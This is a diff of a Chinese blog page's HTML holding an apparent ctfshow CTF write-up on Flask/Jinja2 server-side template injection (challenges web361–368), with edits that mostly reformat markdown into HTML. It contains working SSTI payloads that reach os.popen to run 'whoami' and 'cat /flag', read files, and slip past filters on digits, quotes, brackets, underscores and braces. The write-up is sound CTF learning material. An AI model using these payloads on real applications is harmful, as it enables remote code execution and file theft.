@@ -25,12 +25,12 @@
 <meta property="og:description" content="SSTI，模板引擎注入，主要是利用模板引擎的不正确解析，从而造成信息泄露乃至代码执行等问题。由于涉及到代码执行，因此也常常会和pyjail等沙箱问题一起考察。">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-05-06T13:05:10.000Z">
-<meta property="article:modified_time" content="2023-10-05T05:43:46.664Z">
+<meta property="article:modified_time" content="2023-10-05T06:51:05.427Z">
 <meta property="article:author" content="whistle.H">
 <meta property="article:tag" content="ctf">
+<meta property="article:tag" content="ctfshow">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="wp">
-<meta property="article:tag" content="ctfshow">
 <meta property="article:tag" content="SSTI">
 <meta name="twitter:card" content="summary_large_image">
                         
@@ -304,84 +304,49 @@
 <h4 id="控制语句getshell">控制语句getshell</h4>
 <figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="xml">原理就是找到含有 __builtins__ 的类，然后利用</span><br><span class="xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="xml"></span><br><span class="xml">#读写文件</span><br><span class="xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="xml"></span><br><span class="xml"></span><br></code></pre></td></tr></table></figure>
 <h2 id="web361">web361</h2>
-<p>常见的flask SSTI攻击，使用<code>&#123;&#123;&#125;&#125;`从而将攻击语句实现攻击。
-
-pyjail思路：
-
+<p>常见的flask SSTI攻击，使用花括号从而将攻击语句实现攻击。</p>
+<p>pyjail思路：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;().__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">132</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-flask自带类：
-
+<p>flask自带类：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;cycler.__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>][<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-## web362
-
-不让使用132下标对应的`os._wrap_close`类，waf就是不让输入3,2的数字
-
-于是使用数学四则运算绕过
-
+<h2 id="web362">web362</h2>
+<p>不让使用132下标对应的<code>os._wrap_close</code>类，waf就是不让输入3,2的数字</p>
+<p>于是使用数学四则运算绕过</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[17*8-4].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure>
-
-## web363（引号过滤）
-
-对于Python的引号过滤，我们有如下三种思路
-
-1. 使用flask自带的request类实现参数外带，将真正的payload转移到其他攻击语句中
-2. 使用原生的字符串拼接（flask过滤器，构造对应的字符）
-3. 使用chr函数绕过
-4. 使用16进制绕过
-
-使用flask自带的request类实现参数外带
-
+<h2 id="web363引号过滤">web363（引号过滤）</h2>
+<p>对于Python的引号过滤，我们有如下三种思路</p>
+<ol type="1">
+<li>使用flask自带的request类实现参数外带，将真正的payload转移到其他攻击语句中</li>
+<li>使用原生的字符串拼接（flask过滤器，构造对应的字符）</li>
+<li>使用chr函数绕过</li>
+<li>使用16进制绕过</li>
+</ol>
+<p>使用flask自带的request类实现参数外带</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__.os.popen(request.args.wis).read()&#125;&#125;&amp;wis=cat%<span class="hljs-number">20</span>/flag<br></code></pre></td></tr></table></figure>
-
-使用原生的字符串拼接
-
+<p>使用原生的字符串拼接</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 这样就构造出了os的字符串</span><br>&#123;&#123;(()|select|string)[<span class="hljs-number">8</span>] + (()|select|string)[<span class="hljs-number">18</span>]&#125;&#125;<br><span class="hljs-comment"># 也可以使用dict函数过滤</span><br>&#123;&#123;(<span class="hljs-built_in">dict</span>(c=o)|join)~(<span class="hljs-built_in">dict</span>(a=s)|join)&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-使用16进制编码绕过，需要注意的是，此时我们的代码中是\\x5f，一直到被模板引擎解析了才转变为具体的字符
-
+<p>使用16进制编码绕过，需要注意的是，此时我们的代码中是\x5f，一直到被模板引擎解析了才转变为具体的字符</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;((lipsum|attr(<span class="hljs-string">&quot;\\x5f\\x5fglo&quot;</span><span class="hljs-string">&quot;bals\\x5f\\x5f&quot;</span>)|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;</span>))|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;eval&quot;</span>))(<span class="hljs-string">&quot;\\x5f\\x5fimport\\x5f\\x5f(\\x22os\\x22)\\x2epopen(\\x22whoami\\x22)\\x2eread()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-使用chr函数绕过，此处因为原生不存在chr函数，因此我们需要先导入chr函数
-
-这需要使用flask模板中的控制语句
-
+<p>使用chr函数绕过，此处因为原生不存在chr函数，因此我们需要先导入chr函数</p>
+<p>这需要使用flask模板中的控制语句</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;% set chr=().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="hljs-string">&#123;% print(cycler.__init__.__globals__.os.popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()) %&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
-
-## web364（args过滤）
-
-上一题的第一种方法无法使用，但是我们可以使用request的属性。
-
-同理，我们能用的还有headers，form，values等等
-
+<h2 id="web364args过滤">web364（args过滤）</h2>
+<p>上一题的第一种方法无法使用，但是我们可以使用request的属性。</p>
+<p>同理，我们能用的还有headers，form，values等等</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__.os.popen(request.cookies.wis).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-## web365（[]过滤）
-
-[]过滤最大的影响就是需要找到能够替代索引或者键名的方法
-
+<h2 id="web365过滤">web365（[]过滤）</h2>
+<p>[]过滤最大的影响就是需要找到能够替代索引或者键名的方法</p>
 <figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># 对于list，可以使用pop方法，移除该元素，并获得该元素</span><br>[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>].pop(<span class="hljs-number">4</span>) # <span class="hljs-number">4</span><br><br><span class="hljs-meta"># 对于字符串，get/__getitem__,根据索引获取到对应的值</span><br><br><span class="hljs-meta"># 对于dict，可以使用get或者__getitem__方法，根据键名获取到对应的值</span><br></code></pre></td></tr></table></figure>
-
-payload如下
-
+<p>payload如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;&#123;&#123;().__class__.__base__.__subclasses__().pop(132).__init__.__globals__.popen(</span><br><span class="hljs-string">(config|string).__getitem__(22)+(config|string).__getitem__(40)+(config|string).__getitem__(23)+(config|string).__getitem__(7)+(config|string).__getitem__(279)+(config|string).__getitem__(4)+(config|string).__getitem__(41)+(config|string).__getitem__(40)+(config|string).__getitem__(6)</span><br><span class="hljs-string">).read()&#125;&#125;&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>
-
-## web366(_过滤)
-
-字符串的过滤使用request的参数绕过
-
-对于\_的过滤，\__getitem__可行性不高，但是可以使用flask自带的过滤器attr
-
+<h2 id="web366_过滤">web366(_过滤)</h2>
+<p>字符串的过滤使用request的参数绕过</p>
+<p>对于_的过滤，__getitem__可行性不高，但是可以使用flask自带的过滤器attr</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-## web367(os过滤)
-
-使用get方法来实现字典中字符串的获取
-
+<h2 id="web367os过滤">web367(os过滤)</h2>
+<p>使用get方法来实现字典中字符串的获取</p>
 <figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">request.cookies.a</span>)).get(<span class="hljs-name">request.cookies.c</span>).popen(<span class="hljs-name">request.cookies.b</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
-
-## web368(`&#123;&#123;&#125;&#125;</code>过滤)</p>
+<h2 id="web368花括号过滤">web368(花括号过滤)</h2>
 <p>使用<code>&#123;% %&#125;</code>控制语句来实现绕过</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">print</span>((lipsum|attr(request.cookies.a)).get(request.cookies.c).popen(request.cookies.b).read()) %&#125;<br></code></pre></td></tr></table></figure>
 <h2 id="web369request过滤">web369(request过滤)</h2>
@@ -463,11 +428,11 @@ payload如下
       
         <a href="/tags/ctf/" class="print-no-link">#ctf</a>
       
+        <a href="/tags/ctfshow/" class="print-no-link">#ctfshow</a>
+      
         <a href="/tags/web/" class="print-no-link">#web</a>
       
         <a href="/tags/wp/" class="print-no-link">#wp</a>
-      
-        <a href="/tags/ctfshow/" class="print-no-link">#ctfshow</a>
       
         <a href="/tags/SSTI/" class="print-no-link">#SSTI</a>
       
